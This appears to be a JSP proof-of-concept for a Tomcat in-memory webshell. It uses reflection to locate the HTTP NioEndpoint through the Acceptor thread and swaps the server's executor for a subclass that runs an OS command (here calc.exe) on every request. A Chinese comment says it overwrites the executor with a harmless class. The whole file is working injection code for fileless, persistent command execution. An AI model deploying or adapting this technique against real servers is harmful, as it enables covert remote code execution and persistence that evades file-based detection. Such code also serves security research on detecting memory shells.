<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="org.apache.tomcat.util.threads.ThreadPoolExecutor" %>
<%@ page import="java.util.concurrent.*" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.tomcat.util.net.NioEndpoint" %>


<%!

    public class test extends ThreadPoolExecutor {


        public test(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue<Runnable> workQueue, ThreadFactory threadFactory, RejectedExecutionHandler handler) {
            super(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, handler);
        }


        @Override
        public void execute(Runnable command, long timeout, TimeUnit unit) {

            try {
                Runtime.getRuntime().exec("calc.exe");
            } catch (IOException e) {
                e.printStackTrace();
            }
            super.execute(command, 0L, TimeUnit.MILLISECONDS);
        }
    }

    public Object getField(Object object, String fieldName) {
        Field declaredField;
        Class clazz = object.getClass();
        while (clazz != Object.class) {
            try {

                declaredField = clazz.getDeclaredField(fieldName);
                declaredField.setAccessible(true);
                return declaredField.get(object);
            } catch (NoSuchFieldException | IllegalAccessException e) {
            }
            clazz = clazz.getSuperclass();
        }
        return null;
    }
    public Object getStandardService() {
        Thread[] threads = (Thread[])
                this.getField(Thread.currentThread().getThreadGroup(), "threads");

        for (Thread thread : threads) {
            if (thread == null) {
                continue;
            }
            if ((thread.getName().contains("Acceptor")) &&
                    (thread.getName().contains("http"))) {

                Object target = this.getField(thread, "target");
                Object jioEndPoint = null;
                try {
                    jioEndPoint = getField(target, "this$0");
                } catch (Exception e) {
                }
                if (jioEndPoint == null) {
                    try {
                        jioEndPoint = getField(target, "endpoint");
                    } catch (Exception e) {
                        new Object();
                    }
                } else {
                    return jioEndPoint;
                }
            }

        }
        return new Object();
    }


%>

<%
    Class clazz =Class.forName("org.apache.tomcat.util.net.AbstractEndpoint");
    Class clazz1 =Class.forName("org.apache.tomcat.util.net.NioEndpoint");
    NioEndpoint nioEndpoint= (NioEndpoint) getStandardService();
    Field field =clazz.getDeclaredField("executor");

    field.setAccessible(true);
    ThreadPoolExecutor ob= (ThreadPoolExecutor) field.get(nioEndpoint);

    test test11=new test(ob.getCorePoolSize(),ob.getMaximumPoolSize(),ob.getKeepAliveTime(TimeUnit.MILLISECONDS),
            TimeUnit.MILLISECONDS, ob.getQueue(), ob.getThreadFactory(),
            ob.getRejectedExecutionHandler());

    Method method= clazz1.getMethod("setExecutor", Executor.class);
    method.invoke(nioEndpoint,test11);

    //kill executor  覆盖executor,将test类重写成无危害的类。
%>
